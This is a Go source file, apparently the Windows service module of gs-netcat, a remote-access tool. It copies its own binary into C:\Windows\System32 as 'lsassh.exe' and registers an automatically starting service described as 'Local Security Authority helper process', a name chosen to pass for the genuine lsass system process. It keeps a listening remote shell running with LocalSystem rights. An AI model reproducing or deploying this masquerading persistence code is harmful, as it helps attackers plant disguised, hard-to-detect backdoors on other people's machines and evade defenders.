//go:build windows

package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"

	"golang.org/x/sys/windows/svc"
	"golang.org/x/sys/windows/svc/mgr"
)

const (
	serviceName = "lsassh"
	serviceDesc = "Local Security Authority helper process"
	serviceExe  = "lsassh.exe"
	serviceDir  = `C:\Windows\System32`
	servicePath = serviceDir + `\` + serviceExe
)

// serviceHandler implements svc.Handler for the Windows service.
type serviceHandler struct {
	workerDone chan struct{}
	workerErr  error
}

func (h *serviceHandler) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
	log.Printf("service: Execute called, args=%v, entering StartPending", args)
	changes <- svc.Status{State: svc.StartPending}

	// Run the actual work in a goroutine.
	go func() {
		defer close(h.workerDone)
		log.Printf("service: launching realMain()...")
		h.workerErr = realMain()
		log.Printf("service: realMain() returned: %v", h.workerErr)
	}()

	log.Printf("service: entering Running state")
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

	for {
		select {
		case c := <-r:
			log.Printf("service: received control request cmd=%d", c.Cmd)
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus
			case svc.Stop, svc.Shutdown:
				log.Printf("service: stopping...")
				changes <- svc.Status{State: svc.StopPending}
				select {
				case <-h.workerDone:
					log.Printf("service: worker finished")
				case <-time.After(15 * time.Second):
					log.Printf("service: worker timeout — forcing stop")
				}
				changes <- svc.Status{State: svc.Stopped}
				return
			default:
				log.Printf("service: unexpected control request #%d", c.Cmd)
			}
		case <-h.workerDone:
			log.Printf("service: worker exited on its own")
			changes <- svc.Status{State: svc.Stopped}
			return
		}
	}
}

// winErr returns the Windows error code from an error, if available.
func winErr(err error) string {
	if err == nil {
		return "nil"
	}
	if sysErr, ok := err.(syscall.Errno); ok {
		return fmt.Sprintf("%s (code=%d/0x%x)", err.Error(), uint32(sysErr), uint32(sysErr))
	}
	return err.Error()
}

// reexecAsDaemon installs and starts gs-netcat as a Windows service.
// If the binary is in a user directory (e.g. Desktop), it copies itself
// to C:\gs-netcat\ first — LocalSystem can't access user profiles.
func reexecAsDaemon() {
	exePath, err := os.Executable()
	if err != nil {
		log.Fatalf("daemon: os.Executable() failed: %v", err)
	}
	fmt.Fprintf(os.Stderr, "%s: daemon: executable=%s\n", appName, exePath)
	fmt.Fprintf(os.Stderr, "%s: daemon: args=%v\n", appName, os.Args[1:])

	// Always copy to servicePath so the service runs from a known location.
	if !strings.EqualFold(exePath, servicePath) {
		fmt.Fprintf(os.Stderr, "%s: daemon: copying to %s...\n", appName, servicePath)
		if err := copyFile(exePath, servicePath); err != nil {
			log.Fatalf("daemon: cannot copy to %s: %v", servicePath, err)
		}
		fmt.Fprintf(os.Stderr, "%s: daemon: copied to %s\n", appName, servicePath)
		cmd := exec.Command(servicePath, os.Args[1:]...)
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Start(); err != nil {
			log.Fatalf("daemon: re-exec from %s failed: %v", servicePath, err)
		}
		os.Exit(0)
	}

	// Build the service command line: exe + all args except -D.
	var svcArgs []string
	for _, a := range os.Args[1:] {
		if a != "-D" {
			svcArgs = append(svcArgs, a)
		}
	}

	// Connect to the Service Control Manager.
	fmt.Fprintf(os.Stderr, "%s: daemon: connecting to SCM...\n", appName)
	m, err := mgr.Connect()
	if err != nil {
		log.Fatalf("daemon: mgr.Connect() failed: %s\n"+
			"Run as Administrator to install a Windows service.", winErr(err))
	}
	defer m.Disconnect()
	fmt.Fprintf(os.Stderr, "%s: daemon: connected to SCM\n", appName)

	// CreateService uses syscall.EscapeArg on the exe path and each
	// variadic arg SEPARATELY, then joins them. We must pass args
	// individually — not as part of the exe path string — otherwise
	// the entire thing gets escaped as one argument (wrapped in quotes).
	// This produces the correct svchost-style binary path:
	//   "C:\...\gs-netcat.exe" -s secret -l -v -i
	fmt.Fprintf(os.Stderr, "%s: daemon: service exe: %s\n", appName, exePath)
	fmt.Fprintf(os.Stderr, "%s: daemon: service args: %v\n", appName, svcArgs)

	// Check if service already exists — delete stale one.
	s, err := m.OpenService(serviceName)
	if err == nil {
		fmt.Fprintf(os.Stderr, "%s: daemon: deleting stale service '%s'...\n", appName, serviceName)
		if err := s.Delete(); err != nil {
			fmt.Fprintf(os.Stderr, "%s: daemon: s.Delete() failed: %s\n", appName, winErr(err))
		} else {
			fmt.Fprintf(os.Stderr, "%s: daemon: deleted stale service\n", appName)
		}
		s.Close()
	} else {
		fmt.Fprintf(os.Stderr, "%s: daemon: OpenService('%s'): %s (service does not exist yet)\n", appName, serviceName, winErr(err))
	}

	// Create the service — args passed separately so each gets
	// properly escaped by syscall.EscapeArg in CreateService.
	fmt.Fprintf(os.Stderr, "%s: daemon: calling CreateService('%s', exe, config, args...)\n", appName, serviceName)
	s, err = m.CreateService(
		serviceName,
		exePath,
		mgr.Config{
			DisplayName: serviceName,
			Description: serviceDesc,
			StartType:   mgr.StartAutomatic,
		},
		svcArgs..., // ← each arg escaped separately, produces correct path
	)
	if err != nil {
		log.Fatalf("daemon: CreateService('%s') failed: %s", serviceName, winErr(err))
	}
	fmt.Fprintf(os.Stderr, "%s: daemon: CreateService('%s') OK\n", appName, serviceName)
	s.Close()

	fmt.Fprintf(os.Stderr, "%s: daemon: calling startService('%s')...\n", appName, serviceName)
	if err := startService(m, serviceName); err != nil {
		fmt.Fprintf(os.Stderr, "%s: daemon: startService failed: %v\n", appName, err)
		fmt.Fprintf(os.Stderr, "%s: Check that %s is accessible by LocalSystem.\n", appName, servicePath)
		fmt.Fprintf(os.Stderr, "%s:   sc delete %s\n", appName, serviceName)
		log.Fatalf("daemon: service installed but could not be started")
	}
	os.Exit(0)
}

func startService(m *mgr.Mgr, name string) error {
	fmt.Fprintf(os.Stderr, "%s: daemon: OpenService('%s')...\n", appName, name)
	s, err := m.OpenService(name)
	if err != nil {
		return fmt.Errorf("OpenService('%s'): %s", name, winErr(err))
	}
	defer s.Close()
	fmt.Fprintf(os.Stderr, "%s: daemon: OpenService('%s') OK\n", appName, name)

	fmt.Fprintf(os.Stderr, "%s: daemon: s.Start()...\n", appName)
	err = s.Start()
	if err != nil {
		if strings.Contains(err.Error(), "already been started") ||
			strings.Contains(err.Error(), "1056") {
			fmt.Fprintf(os.Stderr, "%s: daemon: service already running\n", appName)
			return nil
		}
		return fmt.Errorf("s.Start(): %s", winErr(err))
	}
	fmt.Fprintf(os.Stderr, "%s: service '%s' started.\n", appName, name)
	return nil
}

// detachFromTerminal is a no-op on Windows (service handles this).
func detachFromTerminal() {}

// getExitCode extracts the exit code from a child process error on Windows.
func getExitCode(err error) int {
	if err == nil {
		return 0
	}
	if exitErr, ok := err.(*exec.ExitError); ok {
		return exitErr.ExitCode()
	}
	return 255
}

// copyFile copies src to dst, preserving nothing (simple binary copy).
func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()
	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, in)
	return err
}

// tryRunAsService attempts to run as a Windows service. If successful,
// it blocks until the service stops and returns nil. If not running under
// SCM, it returns an error immediately — the caller falls through to
// console mode.
func tryRunAsService() error {
	log.Printf("service: tryRunAsService: calling svc.Run('%s')...", serviceName)
	h := &serviceHandler{workerDone: make(chan struct{})}
	err := svc.Run(serviceName, h)
	if err != nil {
		log.Printf("service: svc.Run() returned error: %s (not a service)", winErr(err))
		return err
	}
	log.Printf("service: svc.Run() returned nil, workerErr=%v", h.workerErr)
	return h.workerErr
}
